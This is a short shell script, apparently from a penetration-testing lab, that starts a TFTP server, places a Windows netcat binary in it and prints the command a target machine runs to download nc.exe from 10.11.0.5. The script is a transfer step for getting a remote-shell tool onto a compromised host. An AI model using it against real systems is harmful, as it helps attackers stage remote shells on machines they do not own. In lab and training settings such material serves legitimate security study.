#!/bin/sh

mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /usr/share/windows-binaries/nc.exe /tftp/

echo "Download:"
echo "tftp -i 10.11.0.5 get nc.exe"
